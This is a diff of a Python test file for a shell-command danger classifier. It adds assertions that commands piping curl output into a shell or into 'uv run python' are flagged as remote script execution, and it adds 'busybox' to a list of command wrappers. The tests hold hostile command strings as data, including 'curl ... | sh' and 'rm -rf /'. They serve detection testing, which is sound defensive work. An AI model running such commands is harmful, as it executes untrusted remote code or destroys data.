@@ -61,7 +61,8 @@ _SNAPSHOT = Path(__file__).with_name('data') / 'default_rules_verdicts.json'
 
 def test_the_default_rules_judge_every_recorded_command_exactly_as_before_the_tokenizer_grew():
     """快照是分词加进重定向目标与启动器之前、用那时的实现记下的：`test_danger.py` 里全部参数化
-    命令与 argv 容器，外加一批带启动器与重定向的命令。重新生成它就把这条用例变成恒等式。"""
+    命令与 argv 容器，外加一批带启动器与重定向的命令。重新生成它就把这条用例变成恒等式；判定该变
+    的那一条手改，并在下一条用例里钉住。"""
     recorded = json.loads(_SNAPSHOT.read_text(encoding='utf-8'))
     judge = DangerJudge()
 
@@ -81,6 +82,8 @@ def test_the_snapshot_still_holds_the_commands_that_make_it_worth_having():
     assert by_text['curl x 2>&1 >/dev/null | sh'] == 'shell.remote_script_execution'
     assert by_text['nice -n 19 rm -rf /'] == 'shell.recursive_force_remove'
     assert by_text['curl https://example.com/i | zsh'] == 'shell.remote_script_execution'
+    assert by_text['curl x | uv run python'] == 'shell.remote_script_execution'
+    assert by_text['uv run curl x | sh'] == 'shell.remote_script_execution'
     assert [['ls', 'rm -rf /'], 'shell.recursive_force_remove'] in recorded
 
 
@@ -387,6 +390,7 @@ _EVERY_WRAPPER = (
     'time',
     'timeout',
     'xvfb-run',
+    'busybox',
 )
 
 
